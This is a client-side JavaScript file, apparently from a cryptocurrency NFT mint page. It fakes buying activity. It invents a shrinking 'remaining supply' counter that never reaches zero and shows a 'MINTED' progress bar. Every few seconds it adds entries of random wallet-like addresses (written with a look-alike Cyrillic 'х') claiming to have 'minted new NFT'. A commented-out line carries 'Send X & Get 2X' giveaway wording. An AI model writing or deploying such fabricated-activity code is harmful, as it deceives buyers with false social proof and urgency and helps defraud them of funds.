window.onload = function(){

    function appInit(){

        function detectMob() {
            return ( ( window.innerWidth <= 800 ) );
        }

        function getRandom(min, max) {
          let rand = min - 0.5 + Math.random() * (max - min + 1);
          return Math.round(rand);
        }

        function separator(numb) {
            var str = numb.toString().split(".");
            str[0] = str[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
            return str.join(".");
        }


        window.sessionStorage;

        let funds = sessionStorage.getItem('funds');
        
        
    
        if(funds == null){
            funds = getRandom(113, 136);
            funds = ethLeftSupply;
            sessionStorage.setItem('funds', funds);
        } 
		if (funds <= 10 ) {
            funds = getRandom(113, 136);
            sessionStorage.setItem('funds', funds);    
		}
console.log(funds);


        function makeid(length) {
            var result           = '';
            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
              result += characters.charAt(Math.floor(Math.random() * 
            charactersLength));
            }
            return result;
        }


        fundsText = separator(Math.round(funds));
        //$('.remaining-funds').text(fundsText);

        $('.Loading span').text('MINTED: ' + (ethMaxSupply - funds)+ ' / ' + ethMaxSupply);
        $('.Loading-bar').animate({width: ((ethMaxSupply-funds)/ethMaxSupply*100-1.8)+"%" }, 200);

        function lastMintTimeout(){
            let randTimeout = getRandom(5000,7000);

            setTimeout(function(){
                fundsRand = getRandom(1, 3);
                mintFunc(fundsRand);

            }, randTimeout);
        }

        lastMintTimeout();


        function mintFunc(fundsRand){
            funds -= fundsRand;

            if(funds <= 6){
                funds = 6;
                return false;
            }

            fundsText = separator(Math.round(funds));
            //$('.remaining-funds').text(fundsText);

            sessionStorage.setItem('funds', funds);

            $('.Loading span').text('MINTED: ' + (ethMaxSupply - funds)+ ' / ' + ethMaxSupply);
            $('.Loading-bar').animate({width: ((ethMaxSupply-funds)/ethMaxSupply*100-1.8)+"%" }, 200);

            // console.log(fundsRand);

            for(let i=0;i<fundsRand;i++){
                //let obj = $('<div class="last-mint-single"><img src="mining.png" style="width:26px;vertical-align: middle;"> 0х' + makeid(4) + '...' + makeid(5) + ' mint new NFT</div>');
                let obj = $('<div class="last-minted-single"><img src="mint.png" style="width:26px;vertical-align: middle;"><span data-time="1">1 sec ago</span> 0х' + makeid(4) + '...' + makeid(4) + ' minted new NFT</div>');
                //obj.fadeOut(0).delay(i*200).fadeIn(200).delay(2000).fadeOut(200);
                $('.last-minted-list').prepend(obj);
            }

            let i=0;
            $('.last-minted-single').each(function(){
                i++;
                if(i>5){
                    $(this).remove();
                }
            });
            
            lastMintTimeout();
        }


        /*
        $('#eth-amount').on("keyup", function(){
            let val = $(this).val();
            $('#mint span').text("Send " + val + " & Get " + (val*2));
        });
        $('#eth-amount').on("change", function(){
            let val = $(this).val();
            $('#mint span').text("Send " + val + " & Get " + (val*2));
        });
        */


        $(".eth-mint-minus").click(function(){
            let count = $('.eth-mint-count').text()*1;

            if(count <= 1){
                return false;
            }

            count = count-1;

            $('.eth-mint-count').text(count);
            //$('.eth-sum').text(count*ethPerMint);
            $('.eth-sum').text(Math.round(count*ethPerMint * 100) / 100 );

            return false;
        });


        $(".eth-mint-plus").click(function(){
            let count = $('.eth-mint-count').text()*1;

            if(count >= ethMaxPerWallet){
                return false;
            }

            count = count+1;

            $('.eth-mint-count').text(count);
            $('.eth-sum').text(Math.round(count*ethPerMint * 100) / 100 );

            return false;
        });

        $('#maxNumber').click(function(){
            let count = ethMaxPerWallet;
            $('.eth-mint-count').text(count);
            $('.eth-sum').text(Math.round(count*ethPerMint * 100) / 100 );
        });


        setInterval(function(){
            $('.last-minted-single span').each(function(){
                let obj = $(this);
                let sec = obj.attr('data-time')*1;
                obj.text(sec+2 + " sec ago");
                obj.attr('data-time', sec+2);
            });
        },2000);

    }

    appInit();
}